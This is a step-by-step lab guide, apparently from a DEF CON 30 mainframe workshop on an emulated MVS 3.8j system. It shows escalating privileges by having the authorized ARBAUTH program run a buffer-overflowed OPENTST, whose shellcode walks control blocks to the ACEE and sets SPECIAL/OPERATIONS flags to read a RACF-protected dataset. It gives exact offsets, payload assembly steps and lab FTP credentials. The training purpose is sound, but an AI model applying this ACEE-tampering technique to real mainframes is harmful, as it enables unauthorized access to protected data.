title: DC30 Lab 9: ARBAUTH Privilege Escalation — Follow the White Rabbit
description: Use the ARBAUTH program to run code as AC=1 (authorized), exploit the OPENTST buffer overflow to modify your ACEE security control block in memory, escalate privileges, and read the protected WHITE.RABBIT dataset. The mainframe equivalent of a kernel exploit — using only documented system functions.

steps.title: The Setup: WHITE.RABBIT
steps.screen:
ISPF EDIT - WHITE.RABBIT(SCRIPT)

 ICH408I USER(HERC01  ) GROUP(SYS1    ) NAME(HERCULES USER  )
   WHITE.RABBIT(SCRIPT)
   ACCESS INTENT(READ   ) ACCESS ALLOWED(NONE   )

 You cannot read WHITE.RABBIT(SCRIPT).
 RACF denies access — you need elevated authority.

 The path:
  1. ARBAUTH runs programs as AC=1 (authorized)
  2. OPENTST has a buffer overflow
  3. Overflow → modify ACEE flags in memory
  4. ACEE flags = your RACF authority
  5. With SPECIAL authority → read anything
steps.expected: Confirm you cannot read WHITE.RABBIT(SCRIPT) and understand the attack chain.
steps.hint: RACF stores your current authority in the ACEE (Accessor Environment Element) — a control block in memory. If we can modify it, we change our effective permissions without touching the RACF database.

steps.title: What is ARBAUTH?
steps.screen:
ARBAUTH — Arbitrary Authorization Runner

Location: SYS2.LINKLIB(ARBAUTH)

What it does:
  ARBAUTH is an APF-authorized program (AC=1)
  It accepts a program name as a parameter
  It runs that program in authorized mode

Why this matters:
  OPENTST has a buffer overflow
  But OPENTST is NOT linked with AC=1
  So OPENTST cannot use MODESET directly

  ARBAUTH runs OPENTST as authorized
  → OPENTST can now use privileged instructions
  → Our shellcode runs in supervisor state
  → We can modify the ACEE

This is a classic 'confused deputy' attack:
  ARBAUTH is the deputy with authority
  We confuse it into running our exploit code
steps.expected: Understand why ARBAUTH is needed and what the confused deputy pattern means.
steps.hint: In modern z/OS this would be caught by RACF program control. On TK5/MVS 3.8j, ARBAUTH is intentionally placed in SYS2.LINKLIB as a lab target.

steps.title: The ACEE Control Block
steps.screen:
ACEE — Accessor Environment Element

The ACEE is created by RACF at logon time.
It lives in your address space memory.
It controls what you're allowed to do RIGHT NOW.

Key fields:
  Offset +X'26' — Authority flags byte 1:
    Bit 0 (X'80'): SPECIAL    — full RACF admin
    Bit 2 (X'20'): OPERATIONS — access all datasets
    Bit 4 (X'08'): AUDITOR    — audit authority
    X'B1' = 10110001 = SPECIAL + OPERATIONS + AUDITOR

  Offset +X'27' — Authority flags byte 2:
    Bit 0 (X'80'): ALTER access to all resources

Control block chain to reach ACEE:
  PSA+X'224' → ASCB
  ASCB+X'6C' → ASXB
  ASXB+X'C8' → ACEE
  ACEE+X'26' → flip to X'B1'

After modification: instant SPECIAL authority
steps.expected: Understand the ACEE structure and which bits to flip for privilege escalation.
steps.hint: This is the same control block chain used in the APF privesc lab. The difference here is we reach it via a buffer overflow + ARBAUTH rather than directly via MODESET in our own APF program.

steps.title: Generate the Privesc Shellcode
steps.screen:
ISPF EDIT - HERC01.JCLLIB(LAB11)
 Command ===> SUBMIT

 //LAB11    JOB ...
 //STEP01   EXEC PGM=ACEEGEN
 //SYSPRINT DD SYSOUT=*
 //SYSUT2   DD DSN=HERC01.LOAD(ACEEJOB),DISP=SHR

 After submit:
  HERC01.LOAD(ACEEJOB) contains shellcode that:
  1. Walks PSA → ASCB → ASXB → ACEE
  2. Sets ACEE+X'26' to X'B1'
  3. Sets ACEE+X'27' to X'80'

 Download via FTP:
  ftp localhost 2121
  user: HERC01  pass: CUL8TR
  cd HERC01.LOAD
  bin
  get ACEEJOB
steps.expected: Submit LAB11 to generate ACEEJOB shellcode. Download it via FTP.
steps.hint: FTP is on port 2121 after submitting jcl/ftpd.jcl. Use binary mode (bin) for all binary file transfers — ASCII mode will corrupt EBCDIC data.

steps.title: Build the Exploit Payload
steps.screen:
Building the overflow payload:

1. You have: DEBRUIJN (400-byte De Bruijn pattern)
2. You have: ACEEJOB (shellcode to modify ACEE)

3. Find the CAFEBABE marker in ACEEJOB
   (this marks where the shellcode starts)

4. Copy bytes between CAFEBABE markers

5. Paste into DEBRUIJN at byte offset 257
   (the offset where R14 gets overwritten)

6. Save as file: PRIVESC

7. Upload via FTP to HERC01.OVERFLOW.ARBAUTH(PRIVESC)
   ftp localhost 2121
   cd HERC01.OVERFLOW.ARBAUTH
   bin
   put PRIVESC

Tools: use scripts/findbytes.py to find byte sequences
steps.expected: Build the PRIVESC payload by combining De Bruijn + ACEEJOB shellcode. Upload via FTP.
steps.hint: The CAFEBABE marker is a well-known magic number used to delimit shellcode boundaries. Use a hex editor (okteta on Linux, xxd on Mac) to find and extract the bytes.

steps.title: Execute the Exploit
steps.expected: Submit LAB12. See WRITING COMPLETE and the contents of WHITE.RABBIT(SCRIPT) in the job log.
steps.hint: COND=EVEN means step 2 runs even if step 1 abends. Step 1 (ARBAUTH+OPENTST) will abend after modifying the ACEE — that's expected. Step 2 (IEBGENER) then runs with our elevated ACEE and reads the protected file.
